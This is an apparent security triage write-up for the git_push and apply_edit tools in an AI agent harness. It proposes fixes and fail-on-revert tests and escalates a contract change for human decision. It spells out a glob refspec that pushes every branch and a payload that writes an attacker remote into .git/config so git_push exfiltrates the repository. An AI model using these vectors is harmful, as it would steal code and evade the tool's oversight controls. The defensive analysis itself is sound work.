## #110 — git_push non-force glob refspec (ROUTINE)

### Current state (verify-cited)
- Branch validation `subprocess_tools.py:422-442`: rejects `remote`/`branch` starting `-` (argv injection), `branch` starting `:` (delete) or `+` (force-push), and exact-match `_GIT_PUSH_BANNED_FLAGS`.
- **Gap**: `branch="refs/heads/*:refs/heads/*"` starts with neither `:` nor `+` → passes the guard → `git push origin refs/heads/*:refs/heads/*` pushes **every** local branch.
- **Why it's low-severity** (P6.5 cycle-2 routing, `architect-routing-on-impl-cycle2.md`): no `+` ⇒ non-fast-forward rejected; no `--prune`/`--mirror` ⇒ no deletion/non-branch refs; the **force**-glob `+refs/heads/*:…` IS already caught by the `+` check; git_push is rev-1 → **HARD on every config → always human-confirmed** with the (visually obvious) glob `branch` surfaced.
- **Message wart** `:436-437`: the `:`/`+` guard says *"only plain branch names are accepted"* — but `main:other` / `HEAD:main` (simple `src:dst`, no leading `:`/`+`) **do** pass. The message over-claims.

### Fix direction
1. Reject `branch` containing `*` (glob) → `LocalToolError`. Keep plain names (`main`) + simple `src:dst` (`main:other`).
2. Reword the `:`/`+` guard message to be accurate (e.g. *"refspec prefixes (`:` delete / `+` force) and glob (`*`) refspecs are rejected; plain branch names and simple `src:dst` are accepted"*).

### Contract / routing
**No contract touch.** ADR-036 D3-iii is explicitly the git_push *input-validation* surface; this is the same family as the P6.5-shipped `:`/`+` rejection (P6.5 brief itself labelled this surface *"input-validation tighten; routine"*). → **Routine; you route α.**

### Fail-on-revert test
`tests/tools/test_subprocess_tools.py` (+ extend `t12`, `test_constitution.py:1046`):
- `branch="refs/heads/*:refs/heads/*"` → `LocalToolError` (the new guard).
- `branch="main:other"` → **still accepted** (simple src:dst not over-blocked).
- assert the reworded message substring.
Revert the `*` check → the glob assertion fails. ✓

## #109 — apply_edit `.git/` config-poisoning (ESCALATE)

### Current state (verify-cited)
- `apply_edit` lives in `mutation_tools.py:137-215`; its **only** path restriction is `_check_path(path_str, resolved_root)` at `:166`.
- `_check_path` (`local.py:120-135`): `candidate = (root / path).resolve()`, reject iff `candidate.relative_to(root)` raises. It blocks **escapes only** (traversal / absolute / symlink-out). **There is no in-root denylist.**
- `.git/config` → `<root>/.git/config` → inside root → **`apply_edit` writes it today.**
- git_push resolves its remote allowlist by running `git remote` (`subprocess_tools.py:444-464`), which reads `.git/config`. So: `apply_edit(".git/config", "[remote \"x\"]\n  url = https://attacker/r")` → `x` is now a *configured* remote → the P6.5-G1 "only configured remotes" restriction **accepts** `git_push(remote="x")` → repo-exfil via a vector P6.5-G1 does not cover. This is the exact caveat already inscribed in **ADR-036 D3-iii (line 75)**.

### Governing ADR
**ADR-036 D3-i** is the apply_edit threat model + pinned write recipe; the contract is asserted behaviorally + by AST in **t11** (`test_constitution.py:910`). The contract today reads as *"contained-in-root ⇒ writable"* — **no carve-out for control-plane paths.**

### Fix directions
- **(a) apply_edit denies writes under `.git/`.** One containment check; closes the poisoning **write** (root cause). Broader-spectrum: also covers any other `.git/` poisoning (e.g. `.git/hooks/pre-push` — currently inert *only* because apply_edit writes mode `0o600` non-exec at `:188` and git runs only executable hooks; a thin reed). **Zero legitimate-use cost** — the agent edits workspace files; git's porcelain owns `.git/`, apply_edit never should. **But it narrows the D3-i containment contract** (introduces the first in-root denylist) → **ADR-036 D3-i amendment.**
- **(b) git_push resolves the remote from a poison-proof source.** Problem: `.git/config` *is* the canonical remote source — there is no poison-proof alternative *inside* git. The only poison-proof option is an **operator-config-pinned remote allowlist** (the deferred "operator-remote-allowlist", ADR-036 D3-iii line 75; the `send_email` domain-allowlist analog) = a **new operator-config surface** → **ADR-036 D3-iii amendment + config.** Narrower: plugs the remote-exfil *symptom* only; leaves `.git/` fully writable.

### Lean
**(a).** It fixes the cause (the write) not the symptom, is broader-spectrum (any `.git/` write, not just the remote one), and costs nothing legitimate. (b) is a bigger surface (new operator config) that closes less.

### Contract / escalation — **why this is yours, not mine**
(a) **narrows the documented containment contract of a HARD, rev-2 write tool** — that is an ADR-036 D3-i amendment + architect Accept, *not* a routine input-validation tighten (contrast #110, where the surface's whole job already *is* refspec validation). There is also a genuine **design choice** embedded: a vs b, and if (a), the deny scope (`.git/` only? all VCS control-dirs `.git`/`.hg`/`.svn`? an operator-configurable in-root denylist?). Per role boundary I do not pick this or pre-Accept the amendment.

→ **Escalated. Architect to: (1) pick (a) or (b); (2) confirm the ADR vehicle — ADR-036 D3-i amendment (lean) vs a small new "control-plane path protection" ADR; (3) if (a), set the deny scope.** I will not open Atom 2 until routed.

### Fail-on-revert test (once routed, assuming (a))
`tests/tools/test_mutation_tools.py` (+ extend `t11`, `test_constitution.py:910`):
- `apply_edit(path=".git/config", …)` → `LocalToolError`.
- `apply_edit(path=".git/hooks/pre-push", …)` → `LocalToolError` (whole-`.git/` deny, not just config).
- a normal in-root write (`src/x.py`) → still succeeds (deny not over-broad).
Revert the deny → the `.git/` assertions fail. ✓
